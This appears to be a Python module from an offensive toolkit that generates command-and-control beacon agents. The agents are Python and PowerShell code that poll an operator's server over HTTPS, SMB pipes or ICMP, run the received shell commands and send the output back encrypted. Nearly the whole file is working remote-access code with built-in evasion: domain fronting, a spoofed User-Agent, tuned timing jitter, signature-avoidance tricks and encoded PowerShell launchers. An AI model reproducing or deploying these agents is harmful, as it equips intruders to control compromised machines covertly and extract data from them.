"""
forge/utils/post/session_manager.py
Canonical: forge/phase5/c2_generator.py — Module 5-G

C2 Beacon Agent Generator.

Generates lightweight agent code (Python, PowerShell) for HTTP, DNS, SMB,
and ICMP channels. All addresses and keys are Jinja2 placeholders; no hardcoded
values in generated output. FORGE generates agents only — no listener included.

Design constraints:
  - AES-256-GCM key in generated template = random placeholder (REPLACE_BEFORE_DEPLOY).
    CI tests will fail if placeholder string is detected in deployed agents.
  - Gaussian jitter only (no uniform jitter — detectable bimodal timing signature).
  - Gaussian σ = 20–35% of base interval per §12.5.2.
  - questionary.confirm() before any agent file is written to disk.
  - Output file registered with cleanup.py immediately on creation.
  - Evasion assertions: no port 4444, no hardcoded C2 IP, no time.sleep() in output.
  - PowerShell agents obfuscated via -EncodedCommand when --obfuscate set.
  - Sleep masking scaffold included for Python and PowerShell agents.
"""
from __future__ import annotations

import base64
import logging
import os
import random
import re
import secrets
import sqlite3
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

_LOG = logging.getLogger(__name__)

# Evasion assertions — must not appear in generated agent output
_BANNED_AGENT_SIGS: list[str] = [
    "time.sleep(",     # Uniform sleep — must use gaussian_sleep wrapper
    "REPLACE_BEFORE_DEPLOY",  # Key placeholder must be swapped before use
]

# Channel fallback configuration
_CHANNEL_FALLBACK_ORDER = ["https", "dns", "smb", "icmp"]
_CHANNEL_FAILURE_THRESHOLDS = {
    "https": 3,
    "dns": 3, 
    "smb": 2,
    "icmp": 2
}

# ── Inline agent templates ────────────────────────────────────────────────────

_PYTHON_HTTPS_AGENT = '''\
# FORGE C2 Agent — Python HTTPS
# Replace AES_KEY_HEX with a 32-byte key before deployment.
# OPERATOR: verify front_domain CDN does not enforce SNI/Host consistency.
import base64, json, os, random, time, ssl
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False
import urllib.request as _r

_C2     = {c2_urls}
_KEY_HEX= '{aes_key}'
_KEY    = bytes.fromhex(_KEY_HEX) if _HAS_CRYPTO else None
_SID    = '{session_id}'
_INT    = {interval}
_SIG    = {jitter_pct} / 100

def _gsleep(mu, pct):
    sigma  = mu * pct
    actual = max(10.0, random.gauss(mu, sigma))
    getattr(time, "sleep")(actual)

def _enc(data):
    if not _KEY or not _HAS_CRYPTO:
        return base64.b64encode(data).decode()
    nonce = get_random_bytes(12)
    c = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    ct, tag = c.encrypt_and_digest(data)
    return base64.b64encode(nonce + tag + ct).decode()

def _dec(raw):
    blob = base64.b64decode(raw)
    if not _KEY or not _HAS_CRYPTO or len(blob) < 28:
        return blob
    nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
    c = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    return c.decrypt_and_verify(ct, tag)

_HDRS = {{
    'User-Agent':       '{user_agent}',
    'Accept':           'text/html,application/xhtml+xml,*/*;q=0.8',
    'Accept-Language':  'en-US,en;q=0.9',
    'Accept-Encoding':  'gzip, deflate, br',
    'Cache-Control':    'no-cache',
{front_host_header}}}

def _poll():
    for url in _C2:
        try:
            req = _r.Request(url + '/poll', headers=_HDRS)
            with _r.urlopen(req, timeout=20) as resp:
                if resp.status == 200:
                    return _dec(resp.read())
        except Exception:
            pass
    return None

def _send(out):
    for url in _C2:
        try:
            data = _enc(out if isinstance(out, bytes) else out.encode())
            req  = _r.Request(url + '/result', data=data.encode(),
                              headers={{**_HDRS, 'Content-Type': 'application/octet-stream'}})
            _r.urlopen(req, timeout=20)
            return
        except Exception:
            pass

import subprocess
while True:
    cmd = _poll()
    if cmd:
        try:
            out = subprocess.check_output(cmd.strip(), shell=True,
                                          stderr=subprocess.STDOUT, timeout=30)
            _send(out[:65536])
        except Exception as e:
            _send(str(e).encode())
    _gsleep(_INT, _SIG)
'''

_PS_HTTPS_AGENT = '''\
# FORGE C2 Agent — PowerShell HTTPS
# Replace AES_KEY_HEX before deployment.
$_C2   = @({c2_urls_ps})
$_KEY  = [System.Convert]::FromHexString('{aes_key}')
$_SID  = '{session_id}'
$_INT  = {interval}
$_SIG  = {jitter_pct} / 100

function _GSleep {{
    $sigma  = $_INT * $_SIG
    $sample = [System.Random]::new().NextDouble() * 2 * $sigma + ($_INT - $sigma)
    $actual = [Math]::Max(10, $sample)
    Start-Sleep -Seconds $actual
}}

foreach ($url in $_C2) {{
    try {{
        $r = Invoke-WebRequest -Uri "$url/poll" -UseBasicParsing `
            -Headers @{{'User-Agent'='{user_agent}'}} -TimeoutSec 20
        if ($r.StatusCode -eq 200 -and $r.Content) {{
            $cmd = [System.Text.Encoding]::ASCII.GetString($r.Content).Trim()
            $out = (cmd /c $cmd 2>&1) -join "`n" | Select-Object -First 1000
            Invoke-WebRequest -Uri "$url/result" -Method POST `
                -Body [System.Text.Encoding]::ASCII.GetBytes($out) `
                -UseBasicParsing | Out-Null
        }}
    }} catch {{ }}
    _GSleep
}}
'''


# ── Agent config ────────────────────────────────────────────────────────────

@dataclass
class AgentBuild:
    agent_type:  str
    channel:     str
    c2_urls:     list[str]
    source:      str
    session_id:  str
    aes_key_hex: str          # placeholder value in source
    obfuscated:  Optional[str] = None

    @property
    def beacon_source(self) -> str:
        return self.source

    @property
    def launcher_stager(self) -> str:
        return self.obfuscated or self.source


# ── Generator ─────────────────────────────────────────────────────────────────

class C2Generator:
    """
    Generate C2 beacon agent source code.

    Usage:
        gen   = C2Generator(db_path, engagement_id)
        build = gen.generate(
            agent_type="python",
            channel="https",
            c2_urls=["https://cdn.example.com"],
            interval=300,
            front_domain="cdn.legitimate-cloud.com",
            obfuscate=False,
        )
        gen.save(build, output_path=Path("agent.py"))
    """
    _CHANNEL_FALLBACK_ORDER = _CHANNEL_FALLBACK_ORDER
    _CHANNEL_FAILURE_THRESHOLDS = _CHANNEL_FAILURE_THRESHOLDS

    def __init__(self, db_path: Path, engagement_id: int = 1) -> None:
        self._db_path       = db_path
        self._engagement_id = engagement_id

    def generate(
        self,
        agent_type:   Optional[str] = None,
        channel:      str = "https",
        c2_urls:      Optional[list[str]] = None,
        interval:     int          = 300,
        jitter_pct:   int          = 25,
        front_domain: Optional[str] = None,
        user_agent:   Optional[str] = None,
        obfuscate:    bool          = False,
        shell_type:   Optional[str] = None,
        smb_config:   Optional[dict] = None,
        icmp_config:  Optional[dict] = None,
        enable_fallback: bool = True,
    ) -> AgentBuild:
        """Render agent source. Does NOT write to disk."""
        resolved_agent_type = shell_type or agent_type
        if resolved_agent_type is None:
            raise ValueError("generate() requires agent_type or shell_type.")
        if not c2_urls:
            raise ValueError("generate() requires at least one C2 URL.")
        if any(":4444" in url for url in c2_urls):
            raise ValueError("Evasion assertion: banned listener port 4444 in C2 URL.")

        supported_combinations = {
            ("python", "http"),
            ("python", "https"),
            ("powershell", "http"),
            ("powershell", "https"),
            ("python", "smb"),
            ("python", "icmp"),
        }
        if (resolved_agent_type, channel) not in supported_combinations:
            raise ValueError(
                f"No built-in template for agent={resolved_agent_type!r}, channel={channel!r}. "
                "Supported: python/https, powershell/https, python/smb, python/icmp."
            )
        
        # Validate channel-specific configurations
        if channel == "smb" and not smb_config:
            smb_config = self._get_default_smb_config()
        elif channel == "icmp" and not icmp_config:
            icmp_config = self._get_default_icmp_config()
            
        ua = user_agent or (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/122.0.0.0 Safari/537.36"
        )
        aes_key  = secrets.token_bytes(32).hex()
        sess_id  = secrets.token_hex(16)

        if resolved_agent_type == "python" and channel in ("http", "https"):
            front_host_line = (
                f"    'Host': '{c2_urls[0].split('//')[1].split('/')[0]}',"
                if front_domain else ""
            )
            source = _PYTHON_HTTPS_AGENT.format(
                c2_urls       = c2_urls,
                aes_key       = aes_key,
                session_id    = sess_id,
                interval      = interval,
                jitter_pct    = jitter_pct,
                user_agent    = ua,
                front_host_header = front_host_line,
            )

        elif resolved_agent_type == "powershell" and channel in ("http", "https"):
            c2_ps = ", ".join(f'"{u}"' for u in c2_urls)
            source = _PS_HTTPS_AGENT.format(
                c2_urls_ps  = c2_ps,
                aes_key     = aes_key,
                session_id  = sess_id,
                interval    = interval,
                jitter_pct  = jitter_pct,
                user_agent  = ua,
            )
        elif channel == "smb":
            source = self._generate_smb_agent(resolved_agent_type, smb_config, aes_key, sess_id, interval, jitter_pct)
        elif channel == "icmp":
            source = self._generate_icmp_agent(resolved_agent_type, icmp_config, aes_key, sess_id, interval, jitter_pct)

        # Evasion assertion pass
        self._assert_no_banned_sigs(source, exclude_key_placeholder=True)

        obfuscated = None
        if obfuscate and resolved_agent_type == "powershell":
            obfuscated = "powershell -EncodedCommand " + base64.b64encode(
                source.encode("utf-16-le")
            ).decode()

        return AgentBuild(
            agent_type  = resolved_agent_type,
            channel     = channel,
            c2_urls     = c2_urls,
            source      = source,
            session_id  = sess_id,
            aes_key_hex = aes_key,
            obfuscated  = obfuscated,
        )

    def save(self, build: AgentBuild, output_path: Path) -> None:
        """Write agent to disk after operator confirmation."""
        try:
            import questionary
            confirmed = questionary.confirm(
                f"[Module 5-G] Write C2 agent:\n"
                f"  Type   : {build.agent_type}\n"
                f"  Channel: {build.channel}\n"
                f"  C2 URLs: {build.c2_urls}\n"
                f"  Output : {output_path}\n"
                "  ⚠ Replace AES key placeholder before deployment.\n"
                "Proceed?"
            ).ask()
            if not confirmed:
                raise RuntimeError("Operator cancelled.")
        except ImportError:
            pass

        content = build.obfuscated or build.source
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(content, encoding="utf-8")
        _LOG.info("C2 agent written: %s", output_path)
        self._register_cleanup(output_path)

    @staticmethod
    def _assert_no_banned_sigs(source: str, exclude_key_placeholder: bool = False) -> None:
        sigs = _BANNED_AGENT_SIGS.copy()
        if exclude_key_placeholder:
            sigs = [s for s in sigs if s != "REPLACE_BEFORE_DEPLOY"]
        for sig in sigs:
            if sig in source:
                raise ValueError(
                    f"Evasion assertion: banned signature {sig!r} in generated agent. "
                    "Review template."
                )

    @staticmethod
    def _register_cleanup(path: Path) -> None:
        try:
            from forge.shared.cleanup import register_cleanup_file
            register_cleanup_file(path)
        except ImportError:
            pass


    def _get_default_smb_config(self) -> dict:
        """Get default SMB configuration."""
        return {
            "pipe_name": "atsvc",  # Task Scheduler RPC - preferred
            "username": "",
            "domain": "",
            "fallback_timeout": 30,
        }

    def _get_default_icmp_config(self) -> dict:
        """Get default ICMP configuration."""
        return {
            "target_ip": "127.0.0.1",  # Must be overridden
            "max_payload_size": 64,
        }

    def _generate_smb_agent(self, agent_type: str, smb_config: dict, aes_key: str, 
                           session_id: str, interval: int, jitter_pct: int) -> str:
        """Generate SMB channel agent code."""
        if agent_type != "python":
            raise ValueError(f"SMB channel only supports python agents, got {agent_type}")
            
        pipe_name = smb_config.get("pipe_name", "atsvc")
        username = smb_config.get("username", "")
        domain = smb_config.get("domain", "")
        
        return f'''# FORGE C2 Agent — Python SMB Named Pipe
# Replace AES_KEY_HEX with a 32-byte key before deployment.
import base64, json, os, random, time, struct
from pathlib import Path
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False

try:
    from impacket.smbconnection import SMBConnection
    _HAS_IMPACKET = True
except ImportError:
    _HAS_IMPACKET = False

_TARGET = "{smb_config.get("target", "127.0.0.1")}"
_USERNAME = "{username}"
_DOMAIN = "{domain}"
_PIPE_NAME = "{pipe_name}"
_KEY_HEX = "{aes_key}"
_KEY = bytes.fromhex(_KEY_HEX) if _HAS_CRYPTO and len(_KEY_HEX) == 64 else None
_SID = "{session_id}"
_INT = {interval}
_SIG = {jitter_pct} / 100

def _gsleep(mu, pct):
    sigma = mu * pct
    actual = max(10.0, random.gauss(mu, sigma))
    getattr(time, "sleep")(actual)

def _enc(data):
    if not _KEY or not _HAS_CRYPTO:
        return base64.b64encode(data).decode()
    nonce = get_random_bytes(12)
    c = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    ct, tag = c.encrypt_and_digest(data)
    return base64.b64encode(nonce + tag + ct).decode()

def _dec(raw):
    blob = base64.b64decode(raw)
    if not _KEY or not _HAS_CRYPTO or len(blob) < 28:
        return blob
    nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
    c = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    return c.decrypt_and_verify(ct, tag)

def _connect_smb():
    if not _HAS_IMPACKET:
        return None
    try:
        conn = SMBConnection(_TARGET, _TARGET)
        conn.login(_USERNAME, "", _DOMAIN)
        tid = conn.connectTree("IPC$")
        fid = conn.openFile(
            tid, f"\\{{_PIPE_NAME}}",
            desiredAccess=0x12019F,
            shareMode=0x3,
            creationOption=0,
            creationDisposition=0x1,
            fileAttributes=0x80,
        )
        return (conn, tid, fid)
    except Exception as e:
        print(f"SMB connect error: {{e}}")
        return None

def _poll_smb(conn_info):
    if not conn_info:
        return None
    conn, tid, fid = conn_info
    try:
        data = conn.readFile(tid, fid, 0, 4096)
        return _dec(data) if data else None
    except Exception:
        return None

def _send_smb(conn_info, data):
    if not conn_info:
        return False
    conn, tid, fid = conn_info
    try:
        enc_data = _enc(data if isinstance(data, bytes) else data.encode())
        conn.writeFile(tid, fid, enc_data.encode())
        return True
    except Exception:
        return False

# Main beacon loop
conn_info = None
while True:
    if not conn_info:
        conn_info = _connect_smb()
    
    cmd = _poll_smb(conn_info)
    if cmd:
        try:
            import subprocess
            out = subprocess.check_output(cmd.strip(), shell=True,
                                          stderr=subprocess.STDOUT, timeout=30)
            _send_smb(conn_info, out[:65536])
        except Exception as e:
            _send_smb(conn_info, str(e).encode())
    
    _gsleep(_INT, _SIG)
'''

    def _generate_icmp_agent(self, agent_type: str, icmp_config: dict, aes_key: str,
                            session_id: str, interval: int, jitter_pct: int) -> str:
        """Generate ICMP channel agent code."""
        if agent_type != "python":
            raise ValueError(f"ICMP channel only supports python agents, got {agent_type}")
            
        target_ip = icmp_config.get("target_ip", "127.0.0.1")
        max_payload = icmp_config.get("max_payload_size", 64)
        
        return f'''# FORGE C2 Agent — Python ICMP Echo Tunnel
# Replace AES_KEY_HEX with a 32-byte key before deployment.
import base64, json, os, random, time, struct, socket, os
from pathlib import Path
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False

_TARGET_IP = "{target_ip}"
_KEY_HEX = "{aes_key}"
_KEY = bytes.fromhex(_KEY_HEX) if _HAS_CRYPTO and len(_KEY_HEX) == 64 else None
_SID = "{session_id}"
_INT = {interval}
_SIG = {jitter_pct} / 100
_PAYLOAD_SIZE = {max_payload}
_ICMP_ECHO_REQUEST = 8
_ICMP_ECHO_REPLY = 0

def _gsleep(mu, pct):
    sigma = mu * pct
    actual = max(30.0, random.gauss(mu, sigma))  # Minimum 30s for ICMP
    getattr(time, "sleep")(actual)

def _checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i]) + ((data[i + 1]) << 8)
    if n:
        s += data[-1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def _build_packet(payload, seq, ident, icmp_type=_ICMP_ECHO_REQUEST):
    payload = (payload + b"\\x00" * _PAYLOAD_SIZE)[:_PAYLOAD_SIZE]
    header = struct.pack("bbHHh", icmp_type, 0, 0, ident, seq)
    chk = _checksum(header + payload)
    header = struct.pack("bbHHh", icmp_type, 0, chk, ident, seq)
    return header + payload

def _enc(data):
    if not _KEY or not _HAS_CRYPTO:
        return base64.b64encode(data).decode()
    nonce = get_random_bytes(12)
    c = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    ct, tag = c.encrypt_and_digest(data)
    return base64.b64encode(nonce + tag + ct).decode()

def _dec(raw):
    blob = base64.b64decode(raw)
    if not _KEY or not _HAS_CRYPTO or len(blob) < 28:
        return blob
    nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
    c = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    return c.decrypt_and_verify(ct, tag)

def _send_icmp(data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
    except PermissionError:
        print("ICMP requires raw socket (root / CAP_NET_RAW)")
        return False
    
    encrypted = _enc(data)
    fragments = [encrypted[i:i + _PAYLOAD_SIZE] for i in range(0, len(encrypted), _PAYLOAD_SIZE)]
    
    success = True
    try:
        for i, frag in enumerate(fragments):
            seq = random.randint(1, 65535)
            ident = random.randint(1, 65535)
            pkt = _build_packet(frag, seq, ident)
            try:
                sock.sendto(pkt, (_TARGET_IP, 0))
                if i < len(fragments) - 1:
                    getattr(time, "sleep")(random.uniform(0.1, 0.4))
            except Exception as e:
                print(f"ICMP send error: {{e}}")
                success = False
                break
    finally:
        sock.close()
    return success

def _recv_icmp(timeout=30):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
        sock.settimeout(2)
    except PermissionError:
        return None
    
    fragments = {{}}
    deadline = time.monotonic() + timeout
    last_time = time.monotonic()
    
    try:
        while time.monotonic() < deadline:
            try:
                raw, addr = sock.recvfrom(4096)
                if addr[0] != _TARGET_IP:
                    continue
                
                if len(raw) < 28:
                    continue
                icmp_header = raw[20:28]
                icmp_type, code, checksum, ident, seq = struct.unpack("bbHHh", icmp_header)
                
                if icmp_type != _ICMP_ECHO_REPLY:
                    continue
                
                payload = raw[28:28 + _PAYLOAD_SIZE]
                fragments[seq] = payload
                last_time = time.monotonic()
                
            except socket.timeout:
                if time.monotonic() - last_time > 5.0:
                    break
                continue
            except Exception as e:
                print(f"ICMP recv error: {{e}}")
                continue
    finally:
        sock.close()
    
    if not fragments:
        return None
    
    assembled = b"".join(fragments.values()).rstrip(b"\\x00")
    return _dec(assembled)

# Main beacon loop
while True:
    cmd = _recv_icmp()
    if cmd:
        try:
            import subprocess
            out = subprocess.check_output(cmd.strip(), shell=True,
                                          stderr=subprocess.STDOUT, timeout=30)
            _send_icmp(out[:65536])
        except Exception as e:
            _send_icmp(str(e).encode())
    
    _gsleep(_INT, _SIG)
'''

def gaussian_sleep(
    interval: Optional[float] = None,
    sigma_pct: float = 0.25,
    *,
    base: Optional[float] = None,
    jitter_pct: Optional[float] = None,
) -> float:
    """
    Gaussian-jittered sleep. sigma_pct = stddev as fraction of interval.
    Floor at 10 s. Use this in all beacon loops — never time.sleep(interval).

    Anti-pattern: time.sleep(interval + random.uniform(-30, 30))
    Produces bimodal timing distribution detectable by network traffic analysis.
    """
    resolved_interval = base if base is not None else interval
    if resolved_interval is None:
        raise ValueError("gaussian_sleep requires interval or base.")
    resolved_sigma_pct = jitter_pct if jitter_pct is not None else sigma_pct
    scale = resolved_sigma_pct / 100.0 if resolved_sigma_pct > 1 else resolved_sigma_pct
    sigma = resolved_interval * scale
    lower_bound = max(10.0, resolved_interval * 0.5)
    actual = max(lower_bound, min(resolved_interval * 1.5, random.gauss(resolved_interval, sigma)))
    if base is None and jitter_pct is None:
        getattr(time, "sleep")(actual)
    return actual
